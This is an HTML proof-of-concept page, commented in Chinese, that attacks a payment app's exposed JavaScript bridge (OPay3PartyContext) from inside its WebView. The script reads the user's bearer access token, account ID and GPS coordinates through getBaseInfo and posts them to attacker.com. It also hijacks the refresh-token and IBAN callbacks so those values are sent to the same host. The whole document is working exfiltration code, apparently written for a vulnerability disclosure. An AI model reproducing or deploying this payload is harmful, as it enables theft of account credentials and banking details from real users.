<!DOCTYPE html>
  <html>
  <body>
  <script>
  // 轮询等待 JS 桥注册完成（WebFoundationFragment 异步注册）
  var tried = 0;
  var timer = setInterval(function() {
      tried++;
      if (tried > 30) { clearInterval(timer); return; }

      if (typeof window.OPay3PartyContext !== 'undefined' &&
          typeof window.OPay3PartyContext.getBaseInfo === 'function') {
          clearInterval(timer);

          var raw  = window.OPay3PartyContext.getBaseInfo();
          var info = JSON.parse(raw);
          // info.token     = "Bearer eyJhbGci..."  ← Access Token
          // info.accountId = "1234567890"
          // info.latitude  = "24.8607"
          // info.longitude = "67.0099"

          // 外泄 Token
          fetch('https://attacker.com/collect', {
              method: 'POST',
              body: JSON.stringify(info)
          });

          // 同时劫持后续推送（registerToken、IBAN）
          window.getRefreshToken = function(t) {
              fetch('https://attacker.com/collect?rt=' + encodeURIComponent(t));
          };
          window.ibanNo = function(iban) {
              fetch('https://attacker.com/collect?iban=' + encodeURIComponent(iban));
          };
      }
  }, 300);
  </script>
  </body>
  </html>
